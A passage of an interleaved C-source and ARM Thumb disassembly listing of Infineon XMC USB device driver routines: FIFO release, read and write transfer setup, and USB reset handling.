 8004766:	4618      	mov	r0, r3
 8004768:	370c      	adds	r7, #12
 800476a:	46bd      	mov	sp, r7
 800476c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004770:	4770      	bx	lr
 8004772:	bf00      	nop
 8004774:	20000a84 	.word	0x20000a84

08004778 <XMC_USBD_lUnassignFifo>:
 *
 * Mark an used tx fifo as free.
 * @param[in] fifo_nr Fifo number to free
 */
static void XMC_USBD_lUnassignFifo(const uint8_t fifo_nr) 
{
 8004778:	b480      	push	{r7}
 800477a:	b083      	sub	sp, #12
 800477c:	af00      	add	r7, sp, #0
 800477e:	4603      	mov	r3, r0
 8004780:	71fb      	strb	r3, [r7, #7]
  xmc_device.txfifomsk = (uint16_t)((uint32_t)xmc_device.txfifomsk & (uint32_t)(~((uint32_t)((uint32_t)1U << fifo_nr))));
 8004782:	4b0a      	ldr	r3, [pc, #40]	; (80047ac <XMC_USBD_lUnassignFifo+0x34>)
 8004784:	f8b3 21fc 	ldrh.w	r2, [r3, #508]	; 0x1fc
 8004788:	79fb      	ldrb	r3, [r7, #7]
 800478a:	2101      	movs	r1, #1
 800478c:	fa01 f303 	lsl.w	r3, r1, r3
 8004790:	b29b      	uxth	r3, r3
 8004792:	43db      	mvns	r3, r3
 8004794:	b29b      	uxth	r3, r3
 8004796:	4013      	ands	r3, r2
 8004798:	b29a      	uxth	r2, r3
 800479a:	4b04      	ldr	r3, [pc, #16]	; (80047ac <XMC_USBD_lUnassignFifo+0x34>)
 800479c:	f8a3 21fc 	strh.w	r2, [r3, #508]	; 0x1fc
}
 80047a0:	bf00      	nop
 80047a2:	370c      	adds	r7, #12
 80047a4:	46bd      	mov	sp, r7
 80047a6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80047aa:	4770      	bx	lr
 80047ac:	20000a84 	.word	0x20000a84

080047b0 <XMC_USBD_lStartReadXfer>:
 * that the transfer values are reasonable (e.g. buffer size is not exceeded).
 *
 * @param[in] ep Endpoint to start the transfer
 */
static void XMC_USBD_lStartReadXfer(XMC_USBD_EP_t *const ep) 
{
 80047b0:	b480      	push	{r7}
 80047b2:	b087      	sub	sp, #28
 80047b4:	af00      	add	r7, sp, #0
 80047b6:	6078      	str	r0, [r7, #4]
  deptsiz_data_t data;
  depctl_data_t epctl;
	
  data.d32 =  0U;
 80047b8:	2300      	movs	r3, #0
 80047ba:	613b      	str	r3, [r7, #16]
  if ((ep->xferTotal - ep->xferLength) > ep->maxTransferSize)
 80047bc:	687b      	ldr	r3, [r7, #4]
 80047be:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 80047c0:	687b      	ldr	r3, [r7, #4]
 80047c2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80047c4:	1ad3      	subs	r3, r2, r3
 80047c6:	687a      	ldr	r2, [r7, #4]
 80047c8:	6892      	ldr	r2, [r2, #8]
 80047ca:	f3c2 0212 	ubfx	r2, r2, #0, #19
 80047ce:	4293      	cmp	r3, r2
 80047d0:	d909      	bls.n	80047e6 <XMC_USBD_lStartReadXfer+0x36>
  {
    ep->xferLength += ep->maxTransferSize;
 80047d2:	687b      	ldr	r3, [r7, #4]
 80047d4:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80047d6:	687a      	ldr	r2, [r7, #4]
 80047d8:	6892      	ldr	r2, [r2, #8]
 80047da:	f3c2 0212 	ubfx	r2, r2, #0, #19
 80047de:	441a      	add	r2, r3
 80047e0:	687b      	ldr	r3, [r7, #4]
 80047e2:	629a      	str	r2, [r3, #40]	; 0x28
 80047e4:	e003      	b.n	80047ee <XMC_USBD_lStartReadXfer+0x3e>
  }
  else
  {
    ep->xferLength = ep->xferTotal;
 80047e6:	687b      	ldr	r3, [r7, #4]
 80047e8:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 80047ea:	687b      	ldr	r3, [r7, #4]
 80047ec:	629a      	str	r2, [r3, #40]	; 0x28
  }
  if (ep->address_u.address_st.number == 0U)
 80047ee:	687b      	ldr	r3, [r7, #4]
 80047f0:	781b      	ldrb	r3, [r3, #0]
 80047f2:	f003 030f 	and.w	r3, r3, #15
 80047f6:	b2db      	uxtb	r3, r3
 80047f8:	2b00      	cmp	r3, #0
 80047fa:	d118      	bne.n	800482e <XMC_USBD_lStartReadXfer+0x7e>
  {
	/* Setup the endpoint to receive 3 setup packages and one normal package.*/
	/* Cast the data pointer to use only one variable */
    deptsiz0_data_t *ep0_data = (deptsiz0_data_t*)&data;
 80047fc:	f107 0310 	add.w	r3, r7, #16
 8004800:	617b      	str	r3, [r7, #20]
    ep0_data->b.pktcnt = 0x1U;
 8004802:	697a      	ldr	r2, [r7, #20]
 8004804:	7893      	ldrb	r3, [r2, #2]
 8004806:	2101      	movs	r1, #1
 8004808:	f361 03c4 	bfi	r3, r1, #3, #2
 800480c:	7093      	strb	r3, [r2, #2]
    ep0_data->b.supcnt = 0x3U;
 800480e:	697a      	ldr	r2, [r7, #20]
 8004810:	78d3      	ldrb	r3, [r2, #3]
 8004812:	f043 0360 	orr.w	r3, r3, #96	; 0x60
 8004816:	70d3      	strb	r3, [r2, #3]
    ep0_data->b.xfersize = (uint8_t)ep->xferTotal;
 8004818:	687b      	ldr	r3, [r7, #4]
 800481a:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800481c:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8004820:	b2d9      	uxtb	r1, r3
 8004822:	697a      	ldr	r2, [r7, #20]
 8004824:	7813      	ldrb	r3, [r2, #0]
 8004826:	f361 0306 	bfi	r3, r1, #0, #7
 800482a:	7013      	strb	r3, [r2, #0]
 800482c:	e032      	b.n	8004894 <XMC_USBD_lStartReadXfer+0xe4>
  }
  else
  {
    /* If requested length is zero, just receive one zero length packet */
    if (ep->xferLength == 0U)
 800482e:	687b      	ldr	r3, [r7, #4]
 8004830:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004832:	2b00      	cmp	r3, #0
 8004834:	d109      	bne.n	800484a <XMC_USBD_lStartReadXfer+0x9a>
    {
      data.b.xfersize = 0U;
 8004836:	693b      	ldr	r3, [r7, #16]
 8004838:	f36f 0312 	bfc	r3, #0, #19
 800483c:	613b      	str	r3, [r7, #16]
      data.b.pktcnt = 1U;
 800483e:	8a7b      	ldrh	r3, [r7, #18]
 8004840:	2201      	movs	r2, #1
 8004842:	f362 03cc 	bfi	r3, r2, #3, #10
 8004846:	827b      	strh	r3, [r7, #18]
 8004848:	e024      	b.n	8004894 <XMC_USBD_lStartReadXfer+0xe4>
    }
    else
    {
      /* setup endpoint to recive a amount of packages by given size */
      data.b.pktcnt = (uint16_t)(((ep->xferLength - ep->xferCount) + (ep->maxPacketSize -(uint32_t)1U))/ep->maxPacketSize);
 800484a:	687b      	ldr	r3, [r7, #4]
 800484c:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 800484e:	687b      	ldr	r3, [r7, #4]
 8004850:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004852:	1ad3      	subs	r3, r2, r3
 8004854:	687a      	ldr	r2, [r7, #4]
 8004856:	6852      	ldr	r2, [r2, #4]
 8004858:	f3c2 22c6 	ubfx	r2, r2, #11, #7
 800485c:	b2d2      	uxtb	r2, r2
 800485e:	4413      	add	r3, r2
 8004860:	3b01      	subs	r3, #1
 8004862:	687a      	ldr	r2, [r7, #4]
 8004864:	6852      	ldr	r2, [r2, #4]
 8004866:	f3c2 22c6 	ubfx	r2, r2, #11, #7
 800486a:	b2d2      	uxtb	r2, r2
 800486c:	fbb3 f3f2 	udiv	r3, r3, r2
 8004870:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8004874:	b29a      	uxth	r2, r3
 8004876:	8a7b      	ldrh	r3, [r7, #18]
 8004878:	f362 03cc 	bfi	r3, r2, #3, #10
 800487c:	827b      	strh	r3, [r7, #18]
      data.b.xfersize =(uint32_t)(ep->xferLength - ep->xferCount);
 800487e:	687b      	ldr	r3, [r7, #4]
 8004880:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8004882:	687b      	ldr	r3, [r7, #4]
 8004884:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004886:	1ad3      	subs	r3, r2, r3
 8004888:	f3c3 0212 	ubfx	r2, r3, #0, #19
 800488c:	693b      	ldr	r3, [r7, #16]
 800488e:	f362 0312 	bfi	r3, r2, #0, #19
 8004892:	613b      	str	r3, [r7, #16]
    }
  }
  if(usbd_init->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004894:	4b22      	ldr	r3, [pc, #136]	; (8004920 <XMC_USBD_lStartReadXfer+0x170>)
 8004896:	681b      	ldr	r3, [r3, #0]
 8004898:	7b5b      	ldrb	r3, [r3, #13]
 800489a:	2b00      	cmp	r3, #0
 800489c:	d10d      	bne.n	80048ba <XMC_USBD_lStartReadXfer+0x10a>
  {
    /* Programm dma address if needed */
    xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepdma = (uint32_t)(ep->xferBuffer);
 800489e:	687b      	ldr	r3, [r7, #4]
 80048a0:	6a59      	ldr	r1, [r3, #36]	; 0x24
 80048a2:	687b      	ldr	r3, [r7, #4]
 80048a4:	781b      	ldrb	r3, [r3, #0]
 80048a6:	f3c3 0303 	ubfx	r3, r3, #0, #4
 80048aa:	b2db      	uxtb	r3, r3
 80048ac:	4a1d      	ldr	r2, [pc, #116]	; (8004924 <XMC_USBD_lStartReadXfer+0x174>)
 80048ae:	3370      	adds	r3, #112	; 0x70
 80048b0:	009b      	lsls	r3, r3, #2
 80048b2:	4413      	add	r3, r2
 80048b4:	685b      	ldr	r3, [r3, #4]
 80048b6:	460a      	mov	r2, r1
 80048b8:	615a      	str	r2, [r3, #20]
  }
  /* setup endpoint size and enable endpoint */
  xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doeptsiz = data.d32;
 80048ba:	687b      	ldr	r3, [r7, #4]
 80048bc:	781b      	ldrb	r3, [r3, #0]
 80048be:	f3c3 0303 	ubfx	r3, r3, #0, #4
 80048c2:	b2db      	uxtb	r3, r3
 80048c4:	4a17      	ldr	r2, [pc, #92]	; (8004924 <XMC_USBD_lStartReadXfer+0x174>)
 80048c6:	3370      	adds	r3, #112	; 0x70
 80048c8:	009b      	lsls	r3, r3, #2
 80048ca:	4413      	add	r3, r2
 80048cc:	685b      	ldr	r3, [r3, #4]
 80048ce:	693a      	ldr	r2, [r7, #16]
 80048d0:	611a      	str	r2, [r3, #16]
 
  epctl.d32 = xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl;
 80048d2:	687b      	ldr	r3, [r7, #4]
 80048d4:	781b      	ldrb	r3, [r3, #0]
 80048d6:	f3c3 0303 	ubfx	r3, r3, #0, #4
 80048da:	b2db      	uxtb	r3, r3
 80048dc:	4a11      	ldr	r2, [pc, #68]	; (8004924 <XMC_USBD_lStartReadXfer+0x174>)
 80048de:	3370      	adds	r3, #112	; 0x70
 80048e0:	009b      	lsls	r3, r3, #2
 80048e2:	4413      	add	r3, r2
 80048e4:	685b      	ldr	r3, [r3, #4]
 80048e6:	681b      	ldr	r3, [r3, #0]
 80048e8:	60fb      	str	r3, [r7, #12]
  epctl.b.cnak = 1U;
 80048ea:	7bfb      	ldrb	r3, [r7, #15]
 80048ec:	f043 0304 	orr.w	r3, r3, #4
 80048f0:	73fb      	strb	r3, [r7, #15]
  epctl.b.epena = 1U;
 80048f2:	7bfb      	ldrb	r3, [r7, #15]
 80048f4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80048f8:	73fb      	strb	r3, [r7, #15]
  xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl = epctl.d32;
 80048fa:	687b      	ldr	r3, [r7, #4]
 80048fc:	781b      	ldrb	r3, [r3, #0]
 80048fe:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8004902:	b2db      	uxtb	r3, r3
 8004904:	4a07      	ldr	r2, [pc, #28]	; (8004924 <XMC_USBD_lStartReadXfer+0x174>)
 8004906:	3370      	adds	r3, #112	; 0x70
 8004908:	009b      	lsls	r3, r3, #2
 800490a:	4413      	add	r3, r2
 800490c:	685b      	ldr	r3, [r3, #4]
 800490e:	68fa      	ldr	r2, [r7, #12]
 8004910:	601a      	str	r2, [r3, #0]
}
 8004912:	bf00      	nop
 8004914:	371c      	adds	r7, #28
 8004916:	46bd      	mov	sp, r7
 8004918:	f85d 7b04 	ldr.w	r7, [sp], #4
 800491c:	4770      	bx	lr
 800491e:	bf00      	nop
 8004920:	20000c8c 	.word	0x20000c8c
 8004924:	20000a84 	.word	0x20000a84

08004928 <XMC_USBD_lStartWriteXfer>:
 * to start a new in transfer
 *
 * @param[in] ep Endpoint to start the transfer
 */
static void XMC_USBD_lStartWriteXfer(XMC_USBD_EP_t *const ep) 
{
 8004928:	b480      	push	{r7}
 800492a:	b085      	sub	sp, #20
 800492c:	af00      	add	r7, sp, #0
 800492e:	6078      	str	r0, [r7, #4]
  deptsiz_data_t size;
  depctl_data_t ctl;
	
  size.d32 = 0U;  
 8004930:	2300      	movs	r3, #0
 8004932:	60fb      	str	r3, [r7, #12]
  ctl.d32 = xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl;
 8004934:	687b      	ldr	r3, [r7, #4]
 8004936:	781b      	ldrb	r3, [r3, #0]
 8004938:	f3c3 0303 	ubfx	r3, r3, #0, #4
 800493c:	b2db      	uxtb	r3, r3
 800493e:	4a5e      	ldr	r2, [pc, #376]	; (8004ab8 <XMC_USBD_lStartWriteXfer+0x190>)
 8004940:	336a      	adds	r3, #106	; 0x6a
 8004942:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004946:	681b      	ldr	r3, [r3, #0]
 8004948:	60bb      	str	r3, [r7, #8]

  if ((ep->xferTotal - ep->xferLength)  < ep->maxTransferSize)
 800494a:	687b      	ldr	r3, [r7, #4]
 800494c:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 800494e:	687b      	ldr	r3, [r7, #4]
 8004950:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004952:	1ad3      	subs	r3, r2, r3
 8004954:	687a      	ldr	r2, [r7, #4]
 8004956:	6892      	ldr	r2, [r2, #8]
 8004958:	f3c2 0212 	ubfx	r2, r2, #0, #19
 800495c:	4293      	cmp	r3, r2
 800495e:	d204      	bcs.n	800496a <XMC_USBD_lStartWriteXfer+0x42>
  {
    ep->xferLength = ep->xferTotal;
 8004960:	687b      	ldr	r3, [r7, #4]
 8004962:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8004964:	687b      	ldr	r3, [r7, #4]
 8004966:	629a      	str	r2, [r3, #40]	; 0x28
 8004968:	e008      	b.n	800497c <XMC_USBD_lStartWriteXfer+0x54>
  }
  else
  {
    ep->xferLength += ep->maxTransferSize;
 800496a:	687b      	ldr	r3, [r7, #4]
 800496c:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800496e:	687a      	ldr	r2, [r7, #4]
 8004970:	6892      	ldr	r2, [r2, #8]
 8004972:	f3c2 0212 	ubfx	r2, r2, #0, #19
 8004976:	441a      	add	r2, r3
 8004978:	687b      	ldr	r3, [r7, #4]
 800497a:	629a      	str	r2, [r3, #40]	; 0x28
  }
  if (ep->xferLength == 0U)
 800497c:	687b      	ldr	r3, [r7, #4]
 800497e:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004980:	2b00      	cmp	r3, #0
 8004982:	d109      	bne.n	8004998 <XMC_USBD_lStartWriteXfer+0x70>
  {
    size.b.xfersize = 0U;
 8004984:	68fb      	ldr	r3, [r7, #12]
 8004986:	f36f 0312 	bfc	r3, #0, #19
 800498a:	60fb      	str	r3, [r7, #12]
    size.b.pktcnt = 1U;
 800498c:	89fb      	ldrh	r3, [r7, #14]
 800498e:	2201      	movs	r2, #1
 8004990:	f362 03cc 	bfi	r3, r2, #3, #10
 8004994:	81fb      	strh	r3, [r7, #14]
 8004996:	e06b      	b.n	8004a70 <XMC_USBD_lStartWriteXfer+0x148>
  }
  else
  {
    if (ep->address_u.address_st.number == 0U)
 8004998:	687b      	ldr	r3, [r7, #4]
 800499a:	781b      	ldrb	r3, [r3, #0]
 800499c:	f003 030f 	and.w	r3, r3, #15
 80049a0:	b2db      	uxtb	r3, r3
 80049a2:	2b00      	cmp	r3, #0
 80049a4:	d110      	bne.n	80049c8 <XMC_USBD_lStartWriteXfer+0xa0>
    {
      size.b.pktcnt = 1U;
 80049a6:	89fb      	ldrh	r3, [r7, #14]
 80049a8:	2201      	movs	r2, #1
 80049aa:	f362 03cc 	bfi	r3, r2, #3, #10
 80049ae:	81fb      	strh	r3, [r7, #14]
      /* ep->maxXferSize equals maxPacketSize */
      size.b.xfersize = (uint32_t)(ep->xferLength - ep->xferCount);
 80049b0:	687b      	ldr	r3, [r7, #4]
 80049b2:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80049b4:	687b      	ldr	r3, [r7, #4]
 80049b6:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80049b8:	1ad3      	subs	r3, r2, r3
 80049ba:	f3c3 0212 	ubfx	r2, r3, #0, #19
 80049be:	68fb      	ldr	r3, [r7, #12]
 80049c0:	f362 0312 	bfi	r3, r2, #0, #19
 80049c4:	60fb      	str	r3, [r7, #12]
 80049c6:	e02a      	b.n	8004a1e <XMC_USBD_lStartWriteXfer+0xf6>
    }
    else
    {
      size.b.xfersize =(uint32_t)(ep->xferLength - ep->xferCount);
 80049c8:	687b      	ldr	r3, [r7, #4]
 80049ca:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80049cc:	687b      	ldr	r3, [r7, #4]
 80049ce:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80049d0:	1ad3      	subs	r3, r2, r3
 80049d2:	f3c3 0212 	ubfx	r2, r3, #0, #19
 80049d6:	68fb      	ldr	r3, [r7, #12]
 80049d8:	f362 0312 	bfi	r3, r2, #0, #19
 80049dc:	60fb      	str	r3, [r7, #12]
      size.b.pktcnt = (uint16_t)(((uint16_t)(ep->xferLength - ep->xferCount) + (uint16_t)((uint16_t)ep->maxPacketSize - 1U))/
 80049de:	687b      	ldr	r3, [r7, #4]
 80049e0:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80049e2:	b29a      	uxth	r2, r3
 80049e4:	687b      	ldr	r3, [r7, #4]
 80049e6:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80049e8:	b29b      	uxth	r3, r3
 80049ea:	1ad3      	subs	r3, r2, r3
 80049ec:	b29b      	uxth	r3, r3
 80049ee:	461a      	mov	r2, r3
 80049f0:	687b      	ldr	r3, [r7, #4]
 80049f2:	685b      	ldr	r3, [r3, #4]
 80049f4:	f3c3 23c6 	ubfx	r3, r3, #11, #7
 80049f8:	b2db      	uxtb	r3, r3
 80049fa:	b29b      	uxth	r3, r3
 80049fc:	3b01      	subs	r3, #1
 80049fe:	b29b      	uxth	r3, r3
 8004a00:	4413      	add	r3, r2
    		 ep->maxPacketSize);
 8004a02:	687a      	ldr	r2, [r7, #4]
 8004a04:	6852      	ldr	r2, [r2, #4]
 8004a06:	f3c2 22c6 	ubfx	r2, r2, #11, #7
 8004a0a:	b2d2      	uxtb	r2, r2
      size.b.pktcnt = (uint16_t)(((uint16_t)(ep->xferLength - ep->xferCount) + (uint16_t)((uint16_t)ep->maxPacketSize - 1U))/
 8004a0c:	fb93 f3f2 	sdiv	r3, r3, r2
 8004a10:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8004a14:	b29a      	uxth	r2, r3
 8004a16:	89fb      	ldrh	r3, [r7, #14]
 8004a18:	f362 03cc 	bfi	r3, r2, #3, #10
 8004a1c:	81fb      	strh	r3, [r7, #14]
    }
    if(usbd_init->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004a1e:	4b27      	ldr	r3, [pc, #156]	; (8004abc <XMC_USBD_lStartWriteXfer+0x194>)
 8004a20:	681b      	ldr	r3, [r3, #0]
 8004a22:	7b5b      	ldrb	r3, [r3, #13]
 8004a24:	2b00      	cmp	r3, #0
 8004a26:	d10c      	bne.n	8004a42 <XMC_USBD_lStartWriteXfer+0x11a>
    {
      /* Program dma*/
      xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepdma = (uint32_t)ep->xferBuffer;
 8004a28:	687b      	ldr	r3, [r7, #4]
 8004a2a:	6a59      	ldr	r1, [r3, #36]	; 0x24
 8004a2c:	687b      	ldr	r3, [r7, #4]
 8004a2e:	781b      	ldrb	r3, [r3, #0]
 8004a30:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8004a34:	b2db      	uxtb	r3, r3
 8004a36:	4a20      	ldr	r2, [pc, #128]	; (8004ab8 <XMC_USBD_lStartWriteXfer+0x190>)
 8004a38:	336a      	adds	r3, #106	; 0x6a
 8004a3a:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004a3e:	460a      	mov	r2, r1
 8004a40:	615a      	str	r2, [r3, #20]
    }
    if(usbd_init->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8004a42:	4b1e      	ldr	r3, [pc, #120]	; (8004abc <XMC_USBD_lStartWriteXfer+0x194>)
 8004a44:	681b      	ldr	r3, [r3, #0]
 8004a46:	7b5b      	ldrb	r3, [r3, #13]
 8004a48:	2b01      	cmp	r3, #1
 8004a4a:	d111      	bne.n	8004a70 <XMC_USBD_lStartWriteXfer+0x148>
    {
      /* enable fifo empty interrupt */
			xmc_device.device_register->dtknqr4_fifoemptymsk |= (uint32_t)((uint32_t)1U << (uint8_t)ep->address_u.address_st.number);
 8004a4c:	4b1a      	ldr	r3, [pc, #104]	; (8004ab8 <XMC_USBD_lStartWriteXfer+0x190>)
 8004a4e:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004a52:	6b59      	ldr	r1, [r3, #52]	; 0x34
 8004a54:	687b      	ldr	r3, [r7, #4]
 8004a56:	781b      	ldrb	r3, [r3, #0]
 8004a58:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8004a5c:	b2db      	uxtb	r3, r3
 8004a5e:	461a      	mov	r2, r3
 8004a60:	2301      	movs	r3, #1
 8004a62:	fa03 f202 	lsl.w	r2, r3, r2
 8004a66:	4b14      	ldr	r3, [pc, #80]	; (8004ab8 <XMC_USBD_lStartWriteXfer+0x190>)
 8004a68:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004a6c:	430a      	orrs	r2, r1
 8004a6e:	635a      	str	r2, [r3, #52]	; 0x34
    }
  }

  /* Program size of transfer and enable endpoint */
  xmc_device.endpoint_in_register[ep->address_u.address_st.number]->dieptsiz = size.d32;
 8004a70:	687b      	ldr	r3, [r7, #4]
 8004a72:	781b      	ldrb	r3, [r3, #0]
 8004a74:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8004a78:	b2db      	uxtb	r3, r3
 8004a7a:	4a0f      	ldr	r2, [pc, #60]	; (8004ab8 <XMC_USBD_lStartWriteXfer+0x190>)
 8004a7c:	336a      	adds	r3, #106	; 0x6a
 8004a7e:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004a82:	68fa      	ldr	r2, [r7, #12]
 8004a84:	611a      	str	r2, [r3, #16]
  ctl.b.epena = 1U;
 8004a86:	7afb      	ldrb	r3, [r7, #11]
 8004a88:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8004a8c:	72fb      	strb	r3, [r7, #11]
  ctl.b.cnak = 1U;
 8004a8e:	7afb      	ldrb	r3, [r7, #11]
 8004a90:	f043 0304 	orr.w	r3, r3, #4
 8004a94:	72fb      	strb	r3, [r7, #11]
  xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl = ctl.d32;
 8004a96:	687b      	ldr	r3, [r7, #4]
 8004a98:	781b      	ldrb	r3, [r3, #0]
 8004a9a:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8004a9e:	b2db      	uxtb	r3, r3
 8004aa0:	4a05      	ldr	r2, [pc, #20]	; (8004ab8 <XMC_USBD_lStartWriteXfer+0x190>)
 8004aa2:	336a      	adds	r3, #106	; 0x6a
 8004aa4:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004aa8:	68ba      	ldr	r2, [r7, #8]
 8004aaa:	601a      	str	r2, [r3, #0]
}
 8004aac:	bf00      	nop
 8004aae:	3714      	adds	r7, #20
 8004ab0:	46bd      	mov	sp, r7
 8004ab2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004ab6:	4770      	bx	lr
 8004ab8:	20000a84 	.word	0x20000a84
 8004abc:	20000c8c 	.word	0x20000c8c

08004ac0 <XMC_USBD_lHandleUSBReset>:
 * When ever the host sets the bus into reset condition the usb otg_core generates
 * an interrupt, which is handled by this function. It resets the complete otg_core
 * into the default state.
 */
static void XMC_USBD_lHandleUSBReset(const XMC_USBD_t *const obj) 
{
 8004ac0:	b580      	push	{r7, lr}
 8004ac2:	b088      	sub	sp, #32
 8004ac4:	af00      	add	r7, sp, #0
 8004ac6:	6078      	str	r0, [r7, #4]
  fifosize_data_t gnptxfsiz;
  daint_data_t daint;
  dcfg_data_t dcfg;
	
  /* Clear the Remote Wakeup Signaling */
  dctl.d32 = xmc_device.device_register->dctl;
 8004ac8:	4b50      	ldr	r3, [pc, #320]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004aca:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004ace:	685b      	ldr	r3, [r3, #4]
 8004ad0:	617b      	str	r3, [r7, #20]
  dctl.b.rmtwkupsig = 1U;
 8004ad2:	7d3b      	ldrb	r3, [r7, #20]
 8004ad4:	f043 0301 	orr.w	r3, r3, #1
 8004ad8:	753b      	strb	r3, [r7, #20]
  xmc_device.device_register->dctl = dctl.d32;
 8004ada:	4b4c      	ldr	r3, [pc, #304]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004adc:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004ae0:	697a      	ldr	r2, [r7, #20]
 8004ae2:	605a      	str	r2, [r3, #4]

  /* enable naks for all eps */
  for (i = 0U;i < (uint8_t)XMC_USBD_NUM_EPS;i++)
 8004ae4:	2300      	movs	r3, #0
 8004ae6:	61fb      	str	r3, [r7, #28]
 8004ae8:	e01a      	b.n	8004b20 <XMC_USBD_lHandleUSBReset+0x60>
  {
    epctl.d32 = xmc_device.endpoint_out_register[i]->doepctl;
 8004aea:	4a48      	ldr	r2, [pc, #288]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004aec:	69fb      	ldr	r3, [r7, #28]
 8004aee:	3370      	adds	r3, #112	; 0x70
 8004af0:	009b      	lsls	r3, r3, #2
 8004af2:	4413      	add	r3, r2
 8004af4:	685b      	ldr	r3, [r3, #4]
 8004af6:	681b      	ldr	r3, [r3, #0]
 8004af8:	61bb      	str	r3, [r7, #24]
		epctl.b.snak = 1U;
 8004afa:	7efb      	ldrb	r3, [r7, #27]
 8004afc:	f043 0308 	orr.w	r3, r3, #8
 8004b00:	76fb      	strb	r3, [r7, #27]
		epctl.b.stall = 0U;
 8004b02:	7ebb      	ldrb	r3, [r7, #26]
 8004b04:	f36f 1345 	bfc	r3, #5, #1
 8004b08:	76bb      	strb	r3, [r7, #26]
		xmc_device.endpoint_out_register[i]->doepctl = epctl.d32;
 8004b0a:	4a40      	ldr	r2, [pc, #256]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004b0c:	69fb      	ldr	r3, [r7, #28]
 8004b0e:	3370      	adds	r3, #112	; 0x70
 8004b10:	009b      	lsls	r3, r3, #2
 8004b12:	4413      	add	r3, r2
 8004b14:	685b      	ldr	r3, [r3, #4]
 8004b16:	69ba      	ldr	r2, [r7, #24]
 8004b18:	601a      	str	r2, [r3, #0]
  for (i = 0U;i < (uint8_t)XMC_USBD_NUM_EPS;i++)
 8004b1a:	69fb      	ldr	r3, [r7, #28]
 8004b1c:	3301      	adds	r3, #1
 8004b1e:	61fb      	str	r3, [r7, #28]
 8004b20:	69fb      	ldr	r3, [r7, #28]
 8004b22:	2b06      	cmp	r3, #6
 8004b24:	d9e1      	bls.n	8004aea <XMC_USBD_lHandleUSBReset+0x2a>
  }

  /* Configure fifos */
  /* Calculate the size of the rx fifo */
  xmc_device.global_register->grxfsiz = 64U;
 8004b26:	4b39      	ldr	r3, [pc, #228]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004b28:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004b2c:	2240      	movs	r2, #64	; 0x40
 8004b2e:	625a      	str	r2, [r3, #36]	; 0x24
  /* Calculate the size of the tx fifo for ep 0 */  
  gnptxfsiz.d32 = 0U;
 8004b30:	2300      	movs	r3, #0
 8004b32:	613b      	str	r3, [r7, #16]
  gnptxfsiz.b.depth = 16U;
 8004b34:	2310      	movs	r3, #16
 8004b36:	827b      	strh	r3, [r7, #18]
  gnptxfsiz.b.startaddr = 64U;
 8004b38:	2340      	movs	r3, #64	; 0x40
 8004b3a:	823b      	strh	r3, [r7, #16]
  xmc_device.global_register->gnptxfsiz = gnptxfsiz.d32;
 8004b3c:	4b33      	ldr	r3, [pc, #204]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004b3e:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004b42:	693a      	ldr	r2, [r7, #16]
 8004b44:	629a      	str	r2, [r3, #40]	; 0x28
  /* calculate the size for the rest */
  for (i = 1U;i < (uint8_t)XMC_USBD_NUM_TX_FIFOS;i++)
 8004b46:	2301      	movs	r3, #1
 8004b48:	61fb      	str	r3, [r7, #28]
 8004b4a:	e011      	b.n	8004b70 <XMC_USBD_lHandleUSBReset+0xb0>
  {
